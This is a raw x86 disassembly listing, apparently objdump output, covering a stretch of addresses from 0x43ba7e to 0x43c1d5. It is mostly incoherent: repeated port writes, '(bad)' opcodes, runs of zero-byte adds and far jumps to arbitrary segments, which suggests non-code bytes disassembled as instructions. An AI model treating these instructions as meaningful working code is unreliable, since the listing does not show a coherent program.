  43ba7e:	mov    es,WORD PTR [esi]
  43ba80:	fadd   QWORD PTR ds:0x5dc068a
  43ba86:	xchg   BYTE PTR [esi],al
  43ba88:	jne    0x43ba75
  43ba8a:	cld    
  43ba8b:	test   DWORD PTR [ebx-0x15],esi
  43ba8e:	cld    
  43ba8f:	cmp    DWORD PTR [ebx-0x15],0xeb737dfc
  43ba96:	cld    
  43ba97:	jns    0x43bb14
  43ba99:	jmp    0x43ba97
  43ba9b:	jne    0x43bb10
  43ba9d:	jmp    0x43ba9b
  43ba9f:	jno    0x43bb1c
  43baa1:	jmp    0x43ba9f
  43baa3:	ins    DWORD PTR es:[edi],dx
  43baa4:	jae    0x43ba91
  43baa6:	cld    
  43baa7:	imul   edi,DWORD PTR [ebx-0x15],0xeb7365fc
  43baae:	cld    
  43baaf:	popa   
  43bab0:	jnp    0x43ba9d
  43bab2:	cld    
  43bab3:	pop    ebp
  43bab4:	jae    0x43baa1
  43bab6:	cld    
  43bab7:	pop    ecx
  43bab8:	jnp    0x43baa5
  43baba:	cld    
  43babb:	push   ebp
  43babc:	jae    0x43baa9
  43babe:	cld    
  43babf:	push   ecx
  43bac0:	jnp    0x43baad
  43bac2:	cld    
  43bac3:	dec    ebp
  43bac4:	jae    0x43bab1
  43bac6:	cld    
  43bac7:	add    al,0x79
  43bac9:	jmp    0x43bac7
  43bacb:	add    BYTE PTR [ecx-0x15],dh
  43bace:	cld    
  43bacf:	cld    
  43bad0:	jbe    0x43babd
  43bad2:	cld    
  43bad3:	clc    
  43bad4:	jbe    0x43bac1
  43bad6:	cld    
  43bad7:	cmp    DWORD PTR [eax],eax
  43bad9:	add    BYTE PTR [eax],al
  43badb:	add    BYTE PTR [eax],al
  43badd:	jnp    0x43baca
  43badf:	cld    
  43bae0:	xor    eax,0x31fceb73
  43bae5:	jnp    0x43bad2
  43bae7:	cld    
  43bae8:	sub    eax,0x29fceb73
  43baed:	jnp    0x43bada
  43baef:	cld    
  43baf0:	and    eax,0x21fceb73
  43baf5:	jnp    0x43bae2
  43baf7:	cld    
  43baf8:	sbb    eax,0x19fceb73
  43bafd:	jnp    0x43baea
  43baff:	cld    
  43bb00:	adc    eax,0x11fceb73
  43bb05:	jnp    0x43bb09
  43bb07:	out    0x3,eax
  43bb09:	jnp    0x43bb13
  43bb0b:	out    0x3,eax
  43bb0d:	outs   dx,DWORD PTR ds:[esi]
  43bb0e:	or     bh,ah
  43bb10:	add    esi,DWORD PTR [ebx+0x8]
  43bb13:	out    0x3,eax
  43bb15:	ja     0x43bb1f
  43bb17:	out    0x3,eax
  43bb19:	retf   
  43bb1a:	push   es
  43bb1b:	out    0x3,eax
  43bb1d:	mov    edi,0xc303e706
  43bb22:	push   es
  43bb23:	out    0x3,eax
  43bb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bb26:	push   es
  43bb27:	out    0x3,eax
  43bb29:	fwait
  43bb2a:	push   es
  43bb2b:	out    0x3,eax
  43bb2d:	pop    DWORD PTR [esi]
  43bb2f:	out    0x3,eax
  43bb31:	xchg   ebx,eax
  43bb32:	push   es
  43bb33:	out    0x3,eax
  43bb35:	xchg   edi,eax
  43bb36:	push   es
  43bb37:	out    0x3,eax
  43bb39:	stos   DWORD PTR es:[edi],eax
  43bb3a:	push   es
  43bb3b:	out    0x3,eax
  43bb3d:	lahf   
  43bb3e:	push   es
  43bb3f:	out    0x3,eax
  43bb41:	add    BYTE PTR [eax],al
  43bb43:	add    BYTE PTR [eax],al
  43bb45:	add    BYTE PTR [ebx+0x4703e706],ah
  43bb4b:	push   es
  43bb4c:	out    0x3,eax
  43bb4e:	cmp    eax,DWORD PTR [esi]
  43bb50:	out    0x3,eax
  43bb52:	das    
  43bb53:	push   es
  43bb54:	out    0x3,eax
  43bb56:	xor    eax,DWORD PTR [esi]
  43bb58:	out    0x3,eax
  43bb5a:	aaa    
  43bb5b:	push   es
  43bb5c:	out    0x3,eax
  43bb5e:	or     eax,DWORD PTR [esi]
  43bb60:	out    0x3,eax
  43bb62:	inc    DWORD PTR ds:0x60303e7
  43bb68:	out    0x3,eax
  43bb6a:	out    0x5,eax
  43bb6c:	out    0x3,eax
  43bb6e:	fild   DWORD PTR ds:0x5cf03e7
  43bb74:	out    0x3,eax
  43bb76:	rol    DWORD PTR ds:0x5d703e7,cl
  43bb7c:	out    0x3,eax
  43bb7e:	jmp    0x43bb85
  43bb80:	out    0x3,eax
  43bb82:	fild   WORD PTR ds:0x9876e900
  43bb88:	add    ch,cl
  43bb8a:	jbe    0x43bb20
  43bb8c:	add    ch,cl
  43bb8e:	jbe    0x43bb20
  43bb90:	add    ch,cl
  43bb92:	jbe    0x43bb20
  43bb94:	add    ch,cl
  43bb96:	jbe    0x43bb20
  43bb98:	add    ch,cl
  43bb9a:	jbe    0x43bb20
  43bb9c:	add    ch,cl
  43bb9e:	jbe    0x43bb20
  43bba0:	add    ebp,ecx
  43bba2:	jbe    0x43bc20
  43bba4:	add    ebp,ecx
  43bba6:	jbe    0x43bc20
  43bba8:	add    ebp,ecx
  43bbaa:	add    BYTE PTR [eax],al
  43bbac:	add    BYTE PTR [eax],al
  43bbae:	add    BYTE PTR [esi+0x74],dh
  43bbb1:	add    ebp,ecx
  43bbb3:	jbe    0x43bc25
  43bbb5:	add    ebp,ecx
  43bbb7:	jbe    0x43bc25
  43bbb9:	add    ebp,ecx
  43bbbb:	jbe    0x43bc25
  43bbbd:	add    ebp,ecx
  43bbbf:	jbe    0x43bc25
  43bbc1:	add    ebp,ecx
  43bbc3:	jbe    0x43bc25
  43bbc5:	add    ebp,ecx
  43bbc7:	jbe    0x43bc25
  43bbc9:	add    ebp,ecx
  43bbcb:	jbe    0x43bc25
  43bbcd:	add    ebp,ecx
  43bbcf:	jbe    0x43bc25
  43bbd1:	add    ebp,ecx
  43bbd3:	jbe    0x43bc25
  43bbd5:	add    ebp,ecx
  43bbd7:	jbe    0x43bc25
  43bbd9:	add    ebp,ecx
  43bbdb:	jbe    0x43bc25
  43bbdd:	add    ebp,ecx
  43bbdf:	jbe    0x43bc25
  43bbe1:	add    ebp,ecx
  43bbe3:	jbe    0x43bc25
  43bbe5:	add    ebp,ecx
  43bbe7:	jbe    0x43bc25
  43bbe9:	add    ebp,ecx
  43bbeb:	jbe    0x43bc25
  43bbed:	add    ebp,ecx
  43bbef:	jbe    0x43bc25
  43bbf1:	add    ebp,ecx
  43bbf3:	jbe    0x43bc25
  43bbf5:	add    ebp,ecx
  43bbf7:	jbe    0x43bc25
  43bbf9:	add    ebp,ecx
  43bbfb:	jbe    0x43bc25
  43bbfd:	add    ebp,ecx
  43bbff:	jbe    0x43bc25
  43bc01:	add    eax,DWORD PTR [eax]
  43bc03:	sbb    al,0x3
  43bc05:	sbb    al,BYTE PTR ds:0x516030c
  43bc0b:	or     al,0x3
  43bc0d:	adc    al,BYTE PTR ds:0x50e02dc
  43bc13:	add    BYTE PTR [eax],al
  43bc15:	add    BYTE PTR [eax],al
  43bc17:	add    ah,bl
  43bc19:	add    cl,BYTE PTR [edx]
  43bc1b:	add    eax,0x50602cc
  43bc20:	int3   
  43bc21:	add    al,BYTE PTR [edx]
  43bc23:	add    eax,0x4fe02dc
  43bc28:	fadd   QWORD PTR [edx]
  43bc2a:	cli    
  43bc2b:	add    al,0xcc
  43bc2d:	add    dh,dh
  43bc2f:	add    al,0xcc
  43bc31:	add    dh,dl
  43bc33:	add    al,0x9c
  43bc35:	add    ch,dh
  43bc37:	add    al,0x9c
  43bc39:	add    ch,dl
  43bc3b:	add    al,0x8c
  43bc3d:	add    ah,dh
  43bc3f:	add    al,0x8c
  43bc41:	add    ah,dl
  43bc43:	add    al,0x9c
  43bc45:	add    bl,dh
  43bc47:	add    al,0x9c
  43bc49:	add    bl,dl
  43bc4b:	add    al,0x8c
  43bc4d:	add    dl,dh
  43bc4f:	add    al,0x8c
  43bc51:	add    dl,dl
  43bc53:	add    al,0x5c
  43bc55:	add    cl,dh
  43bc57:	add    al,0x5c
  43bc59:	add    cl,dl
  43bc5b:	add    al,0x4c
  43bc5d:	add    al,dh
  43bc5f:	add    al,0x4c
  43bc61:	add    al,dl
  43bc63:	add    al,0x5c
  43bc65:	add    bh,BYTE PTR [esi-0x45fda3fc]
  43bc6b:	add    al,0x4c
  43bc6d:	add    dh,BYTE PTR [esi-0x4dfdb3fc]
  43bc73:	add    al,0x1c
  43bc75:	add    ch,BYTE PTR [esi-0x55fde3fc]
  43bc7b:	add    al,0x0
  43bc7d:	add    BYTE PTR [eax],al
  43bc7f:	add    BYTE PTR [eax],al
  43bc81:	or     al,0x2
  43bc83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bc84:	add    al,0x75
  43bc86:	jmp    0x43bc84
  43bc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bc89:	jns    0x43bc76
  43bc8b:	cld    
  43bc8c:	mov    eax,ds:0x9dfceb71
  43bc91:	jns    0x43bc7e
  43bc93:	cld    
  43bc94:	cdq    
  43bc95:	jno    0x43bc82
  43bc97:	cld    
  43bc98:	xchg   ebp,eax
  43bc99:	jns    0x43bc86
  43bc9b:	cld    
  43bc9c:	xchg   ecx,eax
  43bc9d:	jno    0x43bc8a
  43bc9f:	cld    
  43bca0:	lea    edi,[ecx-0x15]
  43bca3:	cld    
  43bca4:	mov    DWORD PTR [ecx-0x15],esi
  43bca7:	cld    
  43bca8:	test   DWORD PTR [ecx-0x15],edi
  43bcab:	cld    
  43bcac:	xor    DWORD PTR [ecx-0x15],0xeb797dfc
  43bcb3:	cld    
  43bcb4:	jns    0x43bd27
  43bcb6:	jmp    0x43bcb4
  43bcb8:	jne    0x43bd33
  43bcba:	jmp    0x43bcb8
  43bcbc:	jno    0x43bd2f
  43bcbe:	jmp    0x43bcbc
  43bcc0:	ins    DWORD PTR es:[edi],dx
  43bcc1:	jns    0x43bcae
  43bcc3:	cld    
  43bcc4:	imul   esi,DWORD PTR [ecx-0x15],0xeb7965fc
  43bccb:	cld    
  43bccc:	popa   
  43bccd:	jno    0x43bcba
  43bccf:	cld    
  43bcd0:	pop    ebp
  43bcd1:	jns    0x43bcbe
  43bcd3:	cld    
  43bcd4:	pop    ecx
  43bcd5:	jno    0x43bcc2
  43bcd7:	cld    
  43bcd8:	push   ebp
  43bcd9:	jns    0x43bcc6
  43bcdb:	cld    
  43bcdc:	push   ecx
  43bcdd:	jno    0x43bcca
  43bcdf:	cld    
  43bce0:	dec    ebp
  43bce1:	jns    0x43bcce
  43bce3:	cld    
  43bce4:	dec    ecx
  43bce5:	add    BYTE PTR [eax],al
  43bce7:	add    BYTE PTR [eax],al
  43bce9:	add    BYTE PTR [ecx-0x15],dh
  43bcec:	cld    
  43bced:	inc    ebp
  43bcee:	jns    0x43bcdb
  43bcf0:	cld    
  43bcf1:	inc    ecx
  43bcf2:	jno    0x43bcdf
  43bcf4:	cld    
  43bcf5:	cmp    eax,0x39fceb79
  43bcfa:	jno    0x43bce7
  43bcfc:	cld    
  43bcfd:	xor    eax,0x31fceb79
  43bd02:	jno    0x43bd06
  43bd04:	out    0x3,eax
  43bd06:	push   ebx
  43bd07:	push   es
  43bd08:	out    0x3,eax
  43bd0a:	dec    edi
  43bd0b:	push   es
  43bd0c:	out    0x3,eax
  43bd0e:	pop    ebx
  43bd0f:	push   es
  43bd10:	out    0x3,eax
  43bd12:	push   edi
  43bd13:	push   es
  43bd14:	out    0x3,eax
  43bd16:	arpl   WORD PTR [esi],ax
  43bd18:	out    0x3,eax
  43bd1a:	pop    edi
  43bd1b:	push   es
  43bd1c:	out    0x3,eax
  43bd1e:	mov    eax,DWORD PTR [esi]
  43bd20:	out    0x3,eax
  43bd22:	xchg   DWORD PTR [esi],eax
  43bd24:	out    0x3,eax
  43bd26:	jae    0x43bd2e
  43bd28:	out    0x3,eax
  43bd2a:	outs   dx,DWORD PTR ds:[esi]
  43bd2b:	push   es
  43bd2c:	out    0x3,eax
  43bd2e:	jnp    0x43bd36
  43bd30:	out    0x3,eax
  43bd32:	ja     0x43bd3a
  43bd34:	out    0x3,eax
  43bd36:	ret    
  43bd37:	add    bh,ah
  43bd39:	add    edi,DWORD PTR [edi-0x54fc1900]
  43bd3f:	add    bh,ah
  43bd41:	add    esp,DWORD PTR [edi-0x6cfc1900]
  43bd47:	add    bh,ah
  43bd49:	add    ecx,DWORD PTR [edi+0x3e700]
  43bd4f:	add    BYTE PTR [eax],al
  43bd51:	add    BYTE PTR [eax],al
  43bd53:	fwait
  43bd54:	add    bh,ah
  43bd56:	add    edx,DWORD PTR [edi-0x5cfc1900]
  43bd5c:	add    bh,ah
  43bd5e:	add    ebx,DWORD PTR [edi+0x4b03e700]
  43bd64:	add    bh,ah
  43bd66:	add    eax,DWORD PTR [edi+0x0]
  43bd69:	out    0x3,eax
  43bd6b:	xor    eax,DWORD PTR [eax]
  43bd6d:	out    0x3,eax
  43bd6f:	jp     0x43bd72
  43bd71:	out    0x3,eax
  43bd73:	outs   dx,BYTE PTR ds:[esi]
  43bd74:	add    edi,esp
  43bd76:	add    esp,DWORD PTR [edx+0x1]
  43bd79:	out    0x3,eax
  43bd7b:	add    di,sp
  43bd7e:	add    ebp,DWORD PTR [ebx+0x1]
  43bd81:	add    cl,ch
  43bd83:	jbe    0x43bdb5
  43bd85:	(bad)  
  43bd86:	call   0xe942f501
  43bd8b:	jbe    0x43bd8c
  43bd8d:	(bad)  
  43bd8e:	call   0xe943b909
  43bd93:	jbe    0x43bd8c
  43bd95:	(bad)  
  43bd96:	call   0xe943b111
  43bd9b:	jbe    0x43bd8c
  43bd9d:	(bad)  
  43bd9e:	call   0xe943aa19
  43bda3:	jbe    0x43bd8c
  43bda5:	(bad)  
  43bda6:	call   0xe943a121
  43bdab:	jbe    0x43bd8c
  43bdad:	(bad)  
  43bdae:	call   0xe9439929
  43bdb3:	jbe    0x43bd8c
  43bdb5:	(bad)  
  43bdb6:	call   0x43bdbb
  43bdbb:	add    BYTE PTR [esi-0x2d],dh
  43bdbe:	(bad)  
  43bdbf:	call   0xe9438d3a
  43bdc4:	jbe    0x43bd92
  43bdc6:	(bad)  
  43bdc7:	call   0xe9438542
  43bdcc:	jbe    0x43bd91
  43bdce:	(bad)  
  43bdcf:	call   0xe9437d4a
  43bdd4:	jbe    0x43bd91
  43bdd6:	(bad)  
  43bdd7:	call   0xe9437552
  43bddc:	jbe    0x43bd91
  43bdde:	(bad)  
  43bddf:	call   0xe9436d5a
  43bde4:	jbe    0x43bd91
  43bde6:	(bad)  
  43bde7:	call   0xe9436562
  43bdec:	jbe    0x43bd91
  43bdee:	(bad)  
  43bdef:	call   0xe9435d6a
  43bdf4:	jbe    0x43be4e
  43bdf6:	stc    
  43bdf7:	sbb    al,0x2e
  43bdf9:	mov    al,BYTE PTR [edx-0x36]
  43bdfc:	mov    ah,0x3f
  43bdfe:	push   ds
  43bdff:	add    BYTE PTR [eax+eax*2+0x3d],cl
  43be03:	add    ch,BYTE PTR [edi+edi*8]
  43be06:	(bad)  
  43be07:	jmp    ebx
  43be09:	sar    dh,0x1f
  43be0c:	sbb    al,0xff
  43be0e:	inc    DWORD PTR [edx+0x7538d419]
  43be14:	adc    eax,DWORD PTR [eax+0x3d]
  43be17:	push   es
  43be18:	fdiv   st(6),st
  43be1a:	(bad)  
  43be1b:	call   DWORD PTR [edi+0xf1bc1]
  43be21:	add    BYTE PTR [eax],al
  43be23:	add    BYTE PTR [eax],al
  43be25:	cmp    dh,0x85
  43be28:	add    al,0x8a
  43be2a:	add    eax,DWORD PTR [eax]
  43be2c:	sbb    DWORD PTR [edx+eax*1+0xe5fd0f7],0xfffffff7
  43be34:	je     0x43be08
  43be36:	jnp    0x43be75
  43be38:	and    eax,edi
  43be3a:	shl    DWORD PTR [edi],0x5e
  43be3d:	push   es
  43be3e:	scas   al,BYTE PTR es:[edi]
  43be3f:	jnp    0x43be05
  43be41:	mov    bl,0xa9
  43be43:	mov    edx,0x3d3fcc08
  43be48:	sbb    cl,ah
  43be4a:	(bad)  
  43be4b:	(bad)  
  43be4c:	call   DWORD PTR [edi]
  43be4e:	rcr    DWORD PTR [ebx],0xf
  43be51:	(bad)  
  43be52:	(bad)  
  43be53:	stc    
  43be54:	and    al,0xd3
  43be56:	(bad)  
  43be57:	(bad)  
  43be58:	call   ebp
  43be5a:	mov    esi,0xd59cfff8
  43be5f:	retf   0xadf7
  43be62:	jge    0x43bea1
  43be64:	or     cl,BYTE PTR [edi]
  43be66:	pop    es
  43be67:	stc    
  43be68:	je     0x43bdfa
  43be6a:	cmp    DWORD PTR [edx+ebx*1],0x5d
  43be6e:	xor    edi,0x7b02a102
  43be74:	inc    ebp
  43be75:	jbe    0x43be79
  43be77:	adc    DWORD PTR [ebp+0x4a],0x7505e03f
  43be7e:	jmp    0xfffc:0xfb75030c
  43be85:	lock out 0x6c,eax
  43be88:	std    
  43be89:	add    BYTE PTR [eax],al
  43be8b:	add    BYTE PTR [eax],al
  43be8d:	add    BYTE PTR [edx],bh
  43be8f:	ins    DWORD PTR es:[edi],dx
  43be90:	cmp    eax,0x419c3204
  43be95:	test   DWORD PTR [eax-0x4a4e0a34],esi
  43be9b:	jmp    0xfd15:0x2a5de081
  43bea2:	std    
  43bea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bea4:	out    dx,al
  43bea5:	mov    esp,0x1886d36
  43beaa:	push   ebp
  43beab:	mov    edi,0xe5b07ce3
  43beb0:	add    eax,DWORD PTR [ebp-0x4e0af3c8]
  43beb6:	xor    eax,0x7ae081ed
  43bebb:	jb     0x43be7d
  43bebd:	or     eax,0x2f296f6
  43bec2:	dec    eax
  43bec3:	in     eax,0x81
  43bec5:	jnp    0x43bf46
  43bec7:	jmp    0x43be58
  43bec9:	add    esi,esi
  43becb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43becc:	jmp    0x5501:0x886cb603
  43bed3:	outs   dx,DWORD PTR ds:[esi]
  43bed4:	stc    
  43bed5:	jl     0x43bf07
  43bed7:	aad    0xf8
  43bed9:	mov    esp,0xffe5ef6
  43bede:	and    bh,bl
  43bee0:	add    DWORD PTR [ebx+0x6f],0xffffffed
  43bee4:	inc    ebx
  43bee5:	call   0xf94a8701
  43beea:	out    dx,al
  43beeb:	es jmp 0x43:0x830c31fe
  43bef3:	add    BYTE PTR [eax],al
  43bef5:	add    BYTE PTR [eax],al
  43bef7:	xchg   esi,eax
  43bef8:	in     eax,dx
  43bef9:	inc    ebx
  43befa:	stc    
  43befb:	mov    al,0xc
  43befd:	inc    ebx
  43befe:	jge    0x43beb8
  43bf00:	add    al,dh
  43bf02:	add    eax,0x61b8518
  43bf07:	outs   dx,DWORD PTR gs:[esi]
  43bf09:	jmp    0x8a3ce829
  43bf0e:	or     DWORD PTR [eax],eax
  43bf10:	jmp    0x85a6:0x275062a
  43bf17:	scas   al,BYTE PTR es:[edi]
  43bf18:	add    al,0xd7
  43bf1a:	mov    ?,WORD PTR [ebx-0x16]
  43bf1d:	pushf  
  43bf1e:	or     DWORD PTR [ecx+edi*8],ebx
  43bf21:	popa   
  43bf22:	mov    edi,0xd94ec579
  43bf27:	adc    cl,bh
  43bf29:	out    0x44,al
  43bf2b:	mov    BYTE PTR [edi+0x16],dh
  43bf2e:	les    eax,FWORD PTR [edi-0x71ab100]
  43bf34:	clc    
  43bf35:	out    0x44,al
  43bf37:	in     al,dx
  43bf38:	ds push es
  43bf3a:	inc    ebp
  43bf3b:	push   0x5ee3e577
  43bf40:	jmp    DWORD PTR [ebp-0x41]
  43bf43:	jns    0x43bf44
  43bf45:	and    eax,0xe6253685
  43bf4a:	inc    esp
  43bf4b:	dec    eax
  43bf4c:	ja     0x43bf33
  43bf4e:	ret    
  43bf4f:	inc    edi
  43bf50:	jmp    DWORD PTR [ebp-0x41]
  43bf53:	pop    ecx
  43bf54:	or     esp,DWORD PTR [esi]
  43bf56:	test   DWORD PTR [esi],ebp
  43bf58:	add    al,0xc7
  43bf5a:	mov    es,WORD PTR [eax]
  43bf5c:	add    BYTE PTR [eax],al
  43bf5e:	add    BYTE PTR [eax],al
  43bf60:	ja     0x43bee7
  43bf62:	mov    ds:0x65c577e4,eax
  43bf67:	mov    esi,0x1ba60579
  43bf6c:	cmc    
  43bf6d:	clc    
  43bf6e:	ror    DWORD PTR [eax],1
  43bf70:	mov    WORD PTR [esi],?
  43bf72:	push   es
  43bf73:	inc    ebp
  43bf74:	add    BYTE PTR [edi-0xa],dh
  43bf77:	ret    
  43bf78:	pop    es
  43bf79:	and    al,0xa2
  43bf7b:	mov    esi,0xe9003870
  43bf80:	jbe    0x43bf84
  43bf82:	stc    
  43bf83:	and    al,0x58
  43bf85:	jg     0x43bfc9
  43bf87:	retf   0xb25d
  43bf8a:	pop    es
  43bf8b:	ins    BYTE PTR es:[edi],dx
  43bf8c:	push   edx
  43bf8d:	mov    bh,ah
  43bf8f:	call   0x8e478285
  43bf94:	xchg   cl,al
  43bf96:	inc    edx
  43bf97:	jmp    0x43bfef
  43bf99:	clc    
  43bf9a:	clc    
  43bf9b:	jmp    0xca86b959
  43bfa0:	mov    cl,0x75
  43bfa2:	jnp    0x43bf5e
  43bfa4:	ss jne 0x43bfc4
  43bfa7:	data16 fist DWORD PTR [esi]
  43bfaa:	cli    
  43bfab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bfac:	sbb    BYTE PTR [eax+0x7b],bh
  43bfaf:	or     ecx,DWORD PTR [esi*2-0x86abefe]
  43bfb6:	clc    
  43bfb7:	jmp    0xa863d6d
  43bfbc:	in     al,dx
  43bfbd:	mov    cl,0x7
  43bfbf:	fs jmp 0x0:0xe8fc89
  43bfc7:	add    BYTE PTR [eax],al
  43bfc9:	stc    
  43bfca:	ret    0x2603
  43bfcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bfce:	mov    ch,0x7c
  43bfd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bfd1:	fprem  
  43bfd3:	mov    ebp,0xfa170b16
  43bfd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bfd9:	fdiv   DWORD PTR [edi+0x7b]
  43bfdc:	retf   
  43bfdd:	mov    ebp,0xfd110274
  43bfe2:	clc    
  43bfe3:	clc    
  43bfe4:	jmp    0xca863d1a
  43bfe9:	popf   
  43bfea:	mov    cl,0x7
  43bfec:	je     0x43c063
  43bfee:	mov    esp,?
  43bff0:	call   0xd64782ec
  43bff5:	inc    ecx
  43bff6:	mov    ch,0x7c
  43bff8:	dec    esp
  43bff9:	ja     0x43c01d
  43bffb:	jl     0x43bffd
  43bffd:	xchg   BYTE PTR [ebx],bl
  43bfff:	hlt    
  43c000:	(bad)  
  43c001:	xor    edi,edi
  43c003:	jp     0x43c04a
  43c005:	jg     0x43c009
  43c007:	mov    ebx,0xf70036e8
  43c00c:	dec    edi
  43c00e:	rcr    DWORD PTR [ebx],0x2
  43c011:	pop    ds
  43c012:	xor    DWORD PTR [ebx+esi*1-0x64],0xffffff91
  43c017:	(bad)  
  43c018:	out    0x94,eax
  43c01a:	std    
  43c01b:	(bad)  
  43c01c:	dec    DWORD PTR [edi]
  43c01e:	cmp    DWORD PTR [ebx+eiz*1],0x1e
  43c022:	inc    esp
  43c023:	jnp    0x43c06a
  43c025:	aas    
  43c026:	idiv   DWORD PTR [ebx-0x21ca67d]
  43c02c:	ret    0x0
  43c02f:	add    BYTE PTR [eax],al
  43c031:	add    BYTE PTR [edi+0x29402b89],cl
  43c037:	cmc    
  43c038:	loopne 0x43c067
  43c03a:	sbb    eax,0xb4c30003
  43c03f:	inc    ebp
  43c040:	idiv   bh
  43c042:	mov    bl,0x43
  43c044:	call   0xf7437263
  43c049:	and    DWORD PTR [ecx],0xfffffff9
  43c04c:	sti    
  43c04d:	je     0x43c029
  43c04f:	sbb    ch,BYTE PTR [eax-0x45006c02]
  43c055:	call   0x43be26
  43c05a:	lahf   
  43c05b:	cmp    DWORD PTR [ebx+eiz*1],0xffffffcf
  43c05f:	inc    ebx
  43c060:	jnp    0x43c0df
  43c062:	retf   0x6dc2
  43c065:	add    eax,0x91bc11f
  43c06a:	pop    edi
  43c06b:	cmp    DWORD PTR [ebx+eiz*1],0xffffff99
  43c06f:	inc    ebx
  43c070:	jnp    0x43c0ef
  43c072:	mov    dh,dl
  43c074:	ins    DWORD PTR es:[edi],dx
  43c075:	add    eax,0x31bc21f
  43c07a:	jne    0x43c028
  43c07c:	jge    0x43c0f9
  43c07e:	jnp    0x43c089
  43c080:	pop    DWORD PTR [edx]
  43c082:	mul    BYTE PTR ds:0x693602dd
  43c088:	rcr    BYTE PTR [esp+edi*2],0xa8
  43c08c:	jl     0x43c109
  43c08e:	jne    0x43c07a
  43c090:	pop    DWORD PTR [ecx]
  43c092:	dec    ebp
  43c093:	push   es
  43c094:	add    bh,cl
  43c096:	add    BYTE PTR [eax],al
  43c098:	add    BYTE PTR [eax],al
  43c09a:	add    BYTE PTR [edx-0x57],dl
  43c09d:	adc    al,0xca
  43c09f:	jne    0x43c08c
  43c0a1:	cld    
  43c0a2:	mov    esp,0xff0406f5
  43c0a7:	shl    ebp,0x14
  43c0aa:	push   esp
  43c0ab:	xor    esi,DWORD PTR [ebp+0x2]
  43c0ae:	mov    ebp,0xff03eef5
  43c0b3:	test   eax,0x1b4814dd
  43c0b8:	pop    ebp
  43c0b9:	add    bh,BYTE PTR [ebp+0xffed6f6]
  43c0bf:	and    ch,0x14
  43c0c2:	cmp    al,0x3
  43c0c4:	inc    ebp
  43c0c5:	add    bh,BYTE PTR [ebp-0x377f3]
  43c0cb:	jne    0x43c0f5
  43c0cd:	jle    0x43c14a
  43c0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c0d0:	stos   DWORD PTR es:[edi],eax
  43c0d1:	pop    DWORD PTR [ecx]
  43c0d3:	int    0x53
  43c0d5:	std    
  43c0d6:	push   DWORD PTR [ebp+0x28]
  43c0d9:	jle    0x43c156
  43c0db:	ja     0x43c0a8
  43c0dd:	pop    DWORD PTR [edx]
  43c0df:	mul    BYTE PTR [esi+0x68b600dd]
  43c0e5:	rcr    BYTE PTR [eax+esi*2],0x28
  43c0e9:	ds jge 0x43c11c
  43c0ec:	jmp    0x3c934dd
  43c0f1:	mov    edx,edi
  43c0f3:	mov    ds:0x7f4376e4,al
  43c0f8:	add    ch,al
  43c0fa:	mov    esi,0xe1238171
  43c0ff:	add    BYTE PTR [eax],al
  43c101:	add    BYTE PTR [eax],al
  43c103:	add    BYTE PTR [ecx+eax*8-0x42],dh
  43c107:	mov    al,ds:0x79c9f57f
  43c10c:	ss sbb al,ch
  43c10f:	mov    esi,0xe1238191
  43c114:	jbe    0x43c0d7
  43c116:	xchg   DWORD PTR gs:[ecx+0x52fe3442],edx
  43c11d:	dec    edi
  43c11e:	out    0x3,eax
  43c120:	jne    0x43c0e3
  43c122:	xchg   DWORD PTR gs:[eax+0x15],ecx
  43c126:	sbb    al,0xff
  43c128:	sar    DWORD PTR [edi],0xc6
  43c12b:	cld    
  43c12c:	stc    
  43c12d:	sub    BYTE PTR [ebx],0xe1
  43c130:	ja     0x43c0f3
  43c132:	mov    es,WORD PTR [ebx-0x7e8e0ad2]
  43c138:	sahf   
  43c139:	or     al,0xe7
  43c13b:	mov    ?,WORD PTR [edx+ebp*8+0x28]
  43c13f:	pop    es
  43c140:	or     al,0xf5
  43c142:	and    eax,0xe7025f1c
  43c147:	add    eax,eax
  43c149:	or     bl,0xd0
  43c14c:	cmp    ch,BYTE PTR [edi-0x14]
  43c14f:	xor    BYTE PTR [esi],0x21
  43c152:	in     al,0x40
  43c154:	push   0x67e3e577
  43c159:	jmp    DWORD PTR [ebp-0x41]
  43c15c:	jns    0x43c15d
  43c15e:	and    eax,0xe6213681
  43c163:	inc    eax
  43c164:	cmc    
  43c165:	jbe    0x43c14e
  43c167:	add    al,BYTE PTR [eax]
  43c169:	add    BYTE PTR [eax],al
  43c16b:	add    BYTE PTR [eax],al
  43c16d:	inc    esi
  43c16e:	cld    
  43c16f:	(bad)  
  43c170:	push   0xffffffbe
  43c172:	hlt    
  43c173:	add    DWORD PTR [ecx-0x63],eax
  43c176:	add    ah,bh
  43c178:	add    esi,DWORD PTR [ebp-0x3f]
  43c17b:	push   DWORD PTR [eax]
  43c17d:	js     0x43c17a
  43c17f:	clc    
  43c180:	out    dx,al
  43c181:	xor    eax,0xb91a7b77
  43c186:	outs   dx,DWORD PTR ds:[esi]
  43c187:	add    dl,cl
  43c189:	popa   
  43c18a:	sti    
  43c18b:	clc    
  43c18c:	(bad)  
  43c18d:	xor    eax,0x71cc74ea
  43c192:	sti    
  43c193:	jl     0x43c1c1
  43c195:	push   esp
  43c196:	cmc    
  43c197:	mov    ebp,0x18f5f36a
  43c19c:	xor    eax,0xac64dc5f
  43c1a1:	jno    0x43c19c
  43c1a3:	jl     0x43c1d1
  43c1a5:	push   esp
  43c1a6:	add    BYTE PTR [ebp-0x706e86f],bh
  43c1ac:	xchg   esi,eax
  43c1ad:	cmc    
  43c1ae:	aas    
  43c1af:	sbb    eax,0xb9eab5eb
  43c1b4:	test   DWORD PTR [ecx-0x7],edi
  43c1b7:	out    0xeb,eax
  43c1b9:	jae    0x43c1b4
  43c1bb:	clc    
  43c1bc:	push   0xfffffffb
  43c1be:	adc    DWORD PTR [eax],eax
  43c1c0:	hlt    
  43c1c1:	sbb    eax,0x7603427f
  43c1c6:	aas    
  43c1c7:	sbb    eax,0xfd16cb6a
  43c1cc:	sub    ebp,esi
  43c1ce:	ja     0x43c1e2
  43c1d0:	call   0x43c1d5
  43c1d5:	add    bl,ch
